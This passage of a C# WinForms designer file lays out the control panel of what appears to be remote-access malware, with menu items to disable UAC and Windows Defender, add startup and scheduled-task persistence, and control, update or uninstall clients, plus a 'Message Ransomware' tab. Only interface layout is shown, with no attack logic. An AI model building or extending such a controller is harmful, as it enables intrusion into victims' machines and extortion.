            this.DisableUACToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("DisableUACToolStripMenuItem.Image")));
            this.DisableUACToolStripMenuItem.Name = "DisableUACToolStripMenuItem";
            this.DisableUACToolStripMenuItem.Size = new System.Drawing.Size(112, 22);
            this.DisableUACToolStripMenuItem.Text = "Disable";
            this.DisableUACToolStripMenuItem.Click += new System.EventHandler(this.DisableUACToolStripMenuItem_Click);
            // 
            // disableWDToolStripMenuItem
            // 
            this.disableWDToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.disableWDToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("disableWDToolStripMenuItem.Image")));
            this.disableWDToolStripMenuItem.Name = "disableWDToolStripMenuItem";
            this.disableWDToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.disableWDToolStripMenuItem.Text = "Disable WD";
            this.disableWDToolStripMenuItem.Click += new System.EventHandler(this.DisableWDToolStripMenuItem_Click);
            // 
            // ChatToolStripMenuItem1
            // 
            this.ChatToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.ChatToolStripMenuItem1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.ChatToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("ChatToolStripMenuItem1.Image")));
            this.ChatToolStripMenuItem1.Name = "ChatToolStripMenuItem1";
            this.ChatToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
            this.ChatToolStripMenuItem1.Text = "Remote Chat";
            this.ChatToolStripMenuItem1.Click += new System.EventHandler(this.ChatToolStripMenuItem1_Click);
            // 
            // startupTaskToolStripMenuItem
            // 
            this.startupTaskToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.startupTaskToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem50,
            this.toolStripMenuItem52});
            this.startupTaskToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.startupTaskToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("startupTaskToolStripMenuItem.Image")));
            this.startupTaskToolStripMenuItem.Name = "startupTaskToolStripMenuItem";
            this.startupTaskToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.startupTaskToolStripMenuItem.Text = "Startup/Task";
            // 
            // toolStripMenuItem50
            // 
            this.toolStripMenuItem50.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.toolStripMenuItem50.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.addSheduleTaskToolStripMenuItem,
            this.toolStripMenuItem51});
            this.toolStripMenuItem50.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.toolStripMenuItem50.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem50.Image")));
            this.toolStripMenuItem50.Name = "toolStripMenuItem50";
            this.toolStripMenuItem50.Size = new System.Drawing.Size(162, 22);
            this.toolStripMenuItem50.Text = "Scheduled Task";
            // 
            // addSheduleTaskToolStripMenuItem
            // 
            this.addSheduleTaskToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.addSheduleTaskToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.addSheduleTaskToolStripMenuItem.Name = "addSheduleTaskToolStripMenuItem";
            this.addSheduleTaskToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
            this.addSheduleTaskToolStripMenuItem.Text = "Add Scheduled Task";
            this.addSheduleTaskToolStripMenuItem.Click += new System.EventHandler(this.addSheduleTaskToolStripMenuItem_Click);
            // 
            // toolStripMenuItem51
            // 
            this.toolStripMenuItem51.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.toolStripMenuItem51.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.toolStripMenuItem51.Name = "toolStripMenuItem51";
            this.toolStripMenuItem51.Size = new System.Drawing.Size(179, 22);
            this.toolStripMenuItem51.Text = "Remove Task";
            this.toolStripMenuItem51.Click += new System.EventHandler(this.toolStripMenuItem51_Click);
            // 
            // toolStripMenuItem52
            // 
            this.toolStripMenuItem52.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.toolStripMenuItem52.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.addToStartupToolStripMenuItem,
            this.toolStripMenuItem53});
            this.toolStripMenuItem52.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.toolStripMenuItem52.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem52.Image")));
            this.toolStripMenuItem52.Name = "toolStripMenuItem52";
            this.toolStripMenuItem52.Size = new System.Drawing.Size(162, 22);
            this.toolStripMenuItem52.Text = "Standard Startup";
            // 
            // addToStartupToolStripMenuItem
            // 
            this.addToStartupToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.addToStartupToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.addToStartupToolStripMenuItem.Name = "addToStartupToolStripMenuItem";
            this.addToStartupToolStripMenuItem.Size = new System.Drawing.Size(187, 22);
            this.addToStartupToolStripMenuItem.Text = "Add to Startup";
            this.addToStartupToolStripMenuItem.Click += new System.EventHandler(this.addToStartupToolStripMenuItem_Click);
            // 
            // toolStripMenuItem53
            // 
            this.toolStripMenuItem53.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.toolStripMenuItem53.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.toolStripMenuItem53.Name = "toolStripMenuItem53";
            this.toolStripMenuItem53.Size = new System.Drawing.Size(187, 22);
            this.toolStripMenuItem53.Text = "Remove from Startup";
            this.toolStripMenuItem53.Click += new System.EventHandler(this.toolStripMenuItem53_Click);
            // 
            // toolStripMenuItem57
            // 
            this.toolStripMenuItem57.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.toolStripMenuItem57.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.toolStripMenuItem57.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem57.Image")));
            this.toolStripMenuItem57.Name = "toolStripMenuItem57";
            this.toolStripMenuItem57.Size = new System.Drawing.Size(180, 22);
            this.toolStripMenuItem57.Text = "System Information";
            this.toolStripMenuItem57.Click += new System.EventHandler(this.InformationToolStripMenuItem_Click);
            // 
            // toolStripMenuItem40
            // 
            this.toolStripMenuItem40.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.toolStripMenuItem40.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem41,
            this.toolStripMenuItem42,
            this.toolStripMenuItem43});
            this.toolStripMenuItem40.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem40.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem40.Image")));
            this.toolStripMenuItem40.Name = "toolStripMenuItem40";
            this.toolStripMenuItem40.Size = new System.Drawing.Size(180, 22);
            this.toolStripMenuItem40.Text = "System Control";
            // 
            // toolStripMenuItem41
            // 
            this.toolStripMenuItem41.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.toolStripMenuItem41.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem41.Name = "toolStripMenuItem41";
            this.toolStripMenuItem41.Size = new System.Drawing.Size(132, 22);
            this.toolStripMenuItem41.Text = "Shut Down";
            this.toolStripMenuItem41.Click += new System.EventHandler(this.ShutDownToolStripMenuItem_Click);
            // 
            // toolStripMenuItem42
            // 
            this.toolStripMenuItem42.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.toolStripMenuItem42.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem42.Name = "toolStripMenuItem42";
            this.toolStripMenuItem42.Size = new System.Drawing.Size(132, 22);
            this.toolStripMenuItem42.Text = "Reboot";
            this.toolStripMenuItem42.Click += new System.EventHandler(this.RebootToolStripMenuItem_Click);
            // 
            // toolStripMenuItem43
            // 
            this.toolStripMenuItem43.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.toolStripMenuItem43.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem43.Name = "toolStripMenuItem43";
            this.toolStripMenuItem43.Size = new System.Drawing.Size(132, 22);
            this.toolStripMenuItem43.Text = "Logout";
            this.toolStripMenuItem43.Click += new System.EventHandler(this.LogoutToolStripMenuItem_Click);
            // 
            // ClientControlToolStripMenuItem
            // 
            this.ClientControlToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.StopToolStripMenuItem1,
            this.UpdateToolStripMenuItem,
            this.restartToolStripMenuItem,
            this.UninstallToolStripMenuItem,
            this.ClientFolderToolStripMenuItem});
            this.ClientControlToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.ClientControlToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("ClientControlToolStripMenuItem.Image")));
            this.ClientControlToolStripMenuItem.Name = "ClientControlToolStripMenuItem";
            this.ClientControlToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.ClientControlToolStripMenuItem.Text = "Client Control";
            // 
            // StopToolStripMenuItem1
            // 
            this.StopToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.StopToolStripMenuItem1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.StopToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("StopToolStripMenuItem1.Image")));
            this.StopToolStripMenuItem1.Name = "StopToolStripMenuItem1";
            this.StopToolStripMenuItem1.Size = new System.Drawing.Size(141, 22);
            this.StopToolStripMenuItem1.Text = "Stop";
            this.StopToolStripMenuItem1.Visible = false;
            this.StopToolStripMenuItem1.Click += new System.EventHandler(this.StopToolStripMenuItem1_Click);
            // 
            // UpdateToolStripMenuItem
            // 
            this.UpdateToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.UpdateToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.UpdateToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("UpdateToolStripMenuItem.Image")));
            this.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem";
            this.UpdateToolStripMenuItem.Size = new System.Drawing.Size(141, 22);
            this.UpdateToolStripMenuItem.Text = "Update";
            this.UpdateToolStripMenuItem.Click += new System.EventHandler(this.UpdateToolStripMenuItem_Click);
            // 
            // restartToolStripMenuItem
            // 
            this.restartToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.restartToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.restartToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("restartToolStripMenuItem.Image")));
            this.restartToolStripMenuItem.Name = "restartToolStripMenuItem";
            this.restartToolStripMenuItem.Size = new System.Drawing.Size(141, 22);
            this.restartToolStripMenuItem.Text = "Restart";
            this.restartToolStripMenuItem.Click += new System.EventHandler(this.restartToolStripMenuItem_Click);
            // 
            // UninstallToolStripMenuItem
            // 
            this.UninstallToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.UninstallToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.UninstallToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("UninstallToolStripMenuItem.Image")));
            this.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem";
            this.UninstallToolStripMenuItem.Size = new System.Drawing.Size(141, 22);
            this.UninstallToolStripMenuItem.Text = "Uninstall";
            this.UninstallToolStripMenuItem.Click += new System.EventHandler(this.UninstallToolStripMenuItem_Click);
            // 
            // ClientFolderToolStripMenuItem
            // 
            this.ClientFolderToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.ClientFolderToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.ClientFolderToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("ClientFolderToolStripMenuItem.Image")));
            this.ClientFolderToolStripMenuItem.Name = "ClientFolderToolStripMenuItem";
            this.ClientFolderToolStripMenuItem.Size = new System.Drawing.Size(141, 22);
            this.ClientFolderToolStripMenuItem.Text = "Client Folder";
            this.ClientFolderToolStripMenuItem.Visible = false;
            this.ClientFolderToolStripMenuItem.Click += new System.EventHandler(this.ClientFolderToolStripMenuItem_Click);
            // 
            // guna2Panel3
            // 
            this.guna2Panel3.Controls.Add(this.Pnlinfo);
            this.guna2Panel3.Controls.Add(this.guna2Panel4);
            this.guna2Panel3.Controls.Add(this.guna2TabControl1);
            this.guna2Panel3.Controls.Add(this.label11);
            this.guna2Panel3.Controls.Add(this.pictureBox1);
            this.guna2Panel3.Controls.Add(this.guna2GradientPanel4);
            this.guna2Panel3.Controls.Add(this.Guna2GradientPanel3);
            this.guna2Panel3.Controls.Add(this.label12);
            this.guna2Panel3.Controls.Add(this.Guna2GradientPanel1);
            this.guna2Panel3.Controls.Add(this.Guna2GradientPanel2);
            this.guna2Panel3.Controls.Add(this.statusStrip1);
            this.guna2Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
            this.guna2Panel3.Location = new System.Drawing.Point(59, 41);
            this.guna2Panel3.Name = "guna2Panel3";
            this.guna2Panel3.Size = new System.Drawing.Size(888, 419);
            this.guna2Panel3.TabIndex = 30;
            this.guna2Panel3.Visible = false;
            // 
            // Pnlinfo
            // 
            this.Pnlinfo.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.Pnlinfo.Controls.Add(this.guna2Button3);
            this.Pnlinfo.Controls.Add(this.guna2Button2);
            this.Pnlinfo.Controls.Add(this.guna2Button1);
            this.Pnlinfo.Location = new System.Drawing.Point(3, 233);
            this.Pnlinfo.Name = "Pnlinfo";
            this.Pnlinfo.Size = new System.Drawing.Size(127, 69);
            this.Pnlinfo.TabIndex = 47;
            this.Pnlinfo.MouseLeave += new System.EventHandler(this.guna2Button6_MouseLeave);
            this.Pnlinfo.MouseHover += new System.EventHandler(this.guna2Button6_MouseHover);
            // 
            // guna2Button3
            // 
            this.guna2Button3.BorderRadius = 7;
            this.guna2Button3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.guna2Button3.Font = new System.Drawing.Font("Trebuchet MS", 9F);
            this.guna2Button3.ForeColor = System.Drawing.Color.White;
            this.guna2Button3.Location = new System.Drawing.Point(3, 48);
            this.guna2Button3.Name = "guna2Button3";
            this.guna2Button3.Size = new System.Drawing.Size(121, 18);
            this.guna2Button3.TabIndex = 2;
            this.guna2Button3.Text = "Contacts";
            this.guna2Button3.Click += new System.EventHandler(this.guna2Button3_Click);
            // 
            // guna2Button2
            // 
            this.guna2Button2.BorderRadius = 7;
            this.guna2Button2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.guna2Button2.Font = new System.Drawing.Font("Trebuchet MS", 9F);
            this.guna2Button2.ForeColor = System.Drawing.Color.White;
            this.guna2Button2.Location = new System.Drawing.Point(3, 26);
            this.guna2Button2.Name = "guna2Button2";
            this.guna2Button2.Size = new System.Drawing.Size(121, 18);
            this.guna2Button2.TabIndex = 1;
            this.guna2Button2.Text = "About";
            this.guna2Button2.Click += new System.EventHandler(this.guna2Button2_Click);
            // 
            // guna2Button1
            // 
            this.guna2Button1.BorderRadius = 7;
            this.guna2Button1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.guna2Button1.Font = new System.Drawing.Font("Trebuchet MS", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2Button1.ForeColor = System.Drawing.Color.White;
            this.guna2Button1.Location = new System.Drawing.Point(3, 3);
            this.guna2Button1.Name = "guna2Button1";
            this.guna2Button1.Size = new System.Drawing.Size(121, 21);
            this.guna2Button1.TabIndex = 0;
            this.guna2Button1.Text = "License";
            this.guna2Button1.Click += new System.EventHandler(this.guna2Button1_Click);
            // 
            // guna2Panel4
            // 
            this.guna2Panel4.Controls.Add(this.guna2TabControl2);
            this.guna2Panel4.Location = new System.Drawing.Point(-1, 110);
            this.guna2Panel4.Name = "guna2Panel4";
            this.guna2Panel4.Size = new System.Drawing.Size(886, 309);
            this.guna2Panel4.TabIndex = 49;
            this.guna2Panel4.Visible = false;
            // 
            // guna2TabControl2
            // 
            this.guna2TabControl2.Controls.Add(this.tabPage5);
            this.guna2TabControl2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2TabControl2.ItemSize = new System.Drawing.Size(150, 22);
            this.guna2TabControl2.Location = new System.Drawing.Point(3, 1);
            this.guna2TabControl2.Name = "guna2TabControl2";
            this.guna2TabControl2.SelectedIndex = 0;
            this.guna2TabControl2.Size = new System.Drawing.Size(880, 304);
            this.guna2TabControl2.TabButtonHoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl2.TabButtonHoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl2.TabButtonHoverState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl2.TabButtonHoverState.ForeColor = System.Drawing.Color.White;
            this.guna2TabControl2.TabButtonHoverState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl2.TabButtonIdleState.BorderColor = System.Drawing.Color.Transparent;
            this.guna2TabControl2.TabButtonIdleState.FillColor = System.Drawing.Color.Transparent;
            this.guna2TabControl2.TabButtonIdleState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl2.TabButtonIdleState.ForeColor = System.Drawing.Color.Honeydew;
            this.guna2TabControl2.TabButtonIdleState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.guna2TabControl2.TabButtonSelectedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl2.TabButtonSelectedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl2.TabButtonSelectedState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl2.TabButtonSelectedState.ForeColor = System.Drawing.Color.White;
            this.guna2TabControl2.TabButtonSelectedState.InnerColor = System.Drawing.Color.Crimson;
            this.guna2TabControl2.TabButtonSize = new System.Drawing.Size(150, 22);
            this.guna2TabControl2.TabIndex = 78;
            this.guna2TabControl2.TabMenuBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl2.TabMenuOrientation = Guna.UI2.WinForms.TabMenuOrientation.HorizontalTop;
            // 
            // tabPage5
            // 
            this.tabPage5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.tabPage5.Controls.Add(this.textBox1);
            this.tabPage5.Controls.Add(this.label6);
            this.tabPage5.Location = new System.Drawing.Point(4, 26);
            this.tabPage5.Name = "tabPage5";
            this.tabPage5.Size = new System.Drawing.Size(872, 274);
            this.tabPage5.TabIndex = 2;
            this.tabPage5.Text = "Message Ransomware";
            // 
            // textBox1
            // 
            this.textBox1.Animated = true;
            this.textBox1.BackColor = System.Drawing.Color.Transparent;
            this.textBox1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(72)))), ((int)(((byte)(75)))));
            this.textBox1.BorderRadius = 5;
            this.textBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.textBox1.DefaultText = resources.GetString("textBox1.DefaultText");
            this.textBox1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(41)))), ((int)(((byte)(46)))), ((int)(((byte)(48)))));
            this.textBox1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.textBox1.Location = new System.Drawing.Point(8, 34);
            this.textBox1.Multiline = true;
            this.textBox1.Name = "textBox1";
            this.textBox1.PasswordChar = '\0';
            this.textBox1.PlaceholderText = "";
            this.textBox1.SelectedText = "";
            this.textBox1.SelectionStart = 830;
            this.textBox1.Size = new System.Drawing.Size(689, 227);
            this.textBox1.TabIndex = 49;
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label6.ForeColor = System.Drawing.Color.Honeydew;
            this.label6.Location = new System.Drawing.Point(8, 9);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(67, 17);
            this.label6.TabIndex = 56;
            this.label6.Text = "Your text:";
            // 
            // guna2TabControl1
            // 
            this.guna2TabControl1.Alignment = System.Windows.Forms.TabAlignment.Bottom;
            this.guna2TabControl1.Controls.Add(this.Tasks);
            this.guna2TabControl1.Controls.Add(this.Desktops);
            this.guna2TabControl1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2TabControl1.ItemSize = new System.Drawing.Size(150, 22);
            this.guna2TabControl1.Location = new System.Drawing.Point(0, 107);
            this.guna2TabControl1.Name = "guna2TabControl1";
            this.guna2TabControl1.SelectedIndex = 0;
            this.guna2TabControl1.Size = new System.Drawing.Size(888, 312);
            this.guna2TabControl1.TabButtonHoverState.BorderColor = System.Drawing.Color.DarkSlateGray;
            this.guna2TabControl1.TabButtonHoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl1.TabButtonHoverState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl1.TabButtonHoverState.ForeColor = System.Drawing.Color.White;
            this.guna2TabControl1.TabButtonHoverState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl1.TabButtonIdleState.BorderColor = System.Drawing.Color.Transparent;
            this.guna2TabControl1.TabButtonIdleState.FillColor = System.Drawing.Color.Transparent;
            this.guna2TabControl1.TabButtonIdleState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl1.TabButtonIdleState.ForeColor = System.Drawing.Color.Honeydew;
            this.guna2TabControl1.TabButtonIdleState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.guna2TabControl1.TabButtonSelectedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl1.TabButtonSelectedState.FillColor = System.Drawing.Color.DarkSlateGray;
            this.guna2TabControl1.TabButtonSelectedState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl1.TabButtonSelectedState.ForeColor = System.Drawing.Color.White;
            this.guna2TabControl1.TabButtonSelectedState.InnerColor = System.Drawing.Color.Teal;
            this.guna2TabControl1.TabButtonSize = new System.Drawing.Size(150, 22);
            this.guna2TabControl1.TabIndex = 59;
            this.guna2TabControl1.TabMenuBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl1.TabMenuOrientation = Guna.UI2.WinForms.TabMenuOrientation.HorizontalBottom;
            // 
            // Tasks
            // 
            this.Tasks.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.Tasks.Controls.Add(this.guna2VScrollBar2);
            this.Tasks.Controls.Add(this.listView2);
            this.Tasks.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Tasks.Location = new System.Drawing.Point(4, 4);
            this.Tasks.Name = "Tasks";
            this.Tasks.Padding = new System.Windows.Forms.Padding(3);
            this.Tasks.Size = new System.Drawing.Size(880, 282);
            this.Tasks.TabIndex = 1;
            this.Tasks.Text = "Logs";
            // 
            // guna2VScrollBar2
            // 
            this.guna2VScrollBar2.BindingContainer = this.listView2;
            this.guna2VScrollBar2.BorderRadius = 5;
            this.guna2VScrollBar2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2VScrollBar2.InUpdate = false;
            this.guna2VScrollBar2.LargeChange = 10;
            this.guna2VScrollBar2.Location = new System.Drawing.Point(868, 2);
            this.guna2VScrollBar2.Name = "guna2VScrollBar2";
            this.guna2VScrollBar2.ScrollbarSize = 10;
            this.guna2VScrollBar2.Size = new System.Drawing.Size(10, 276);
            this.guna2VScrollBar2.TabIndex = 60;
            this.guna2VScrollBar2.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.guna2VScrollBar2.ThumbStyle = Guna.UI2.WinForms.Enums.ThumbStyle.Inset;
            // 
            // listView2
            // 
            this.listView2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.listView2.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("listView2.BackgroundImage")));
            this.listView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView2.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader2,
            this.Logs});
            this.listView2.ContextMenuStrip = this.contextMenuLogs;
            this.listView2.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView2.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.listView2.ForeColor = System.Drawing.Color.White;
            this.listView2.FullRowSelect = true;
            this.listView2.HideSelection = false;
            this.listView2.Location = new System.Drawing.Point(3, 3);
            this.listView2.Margin = new System.Windows.Forms.Padding(2);
            this.listView2.Name = "listView2";
            this.listView2.ShowGroups = false;
            this.listView2.ShowItemToolTips = true;
            this.listView2.Size = new System.Drawing.Size(874, 276);
            this.listView2.TabIndex = 30;
            this.listView2.UseCompatibleStateImageBehavior = false;
            this.listView2.View = System.Windows.Forms.View.Details;
            this.listView2.SelectedIndexChanged += new System.EventHandler(this.listView2_SelectedIndexChanged);
            // 
            // columnHeader2
            // 
            this.columnHeader2.DisplayIndex = 1;
            this.columnHeader2.Text = "";
            this.columnHeader2.Width = 0;
            // 
            // Logs
            // 
            this.Logs.DisplayIndex = 0;
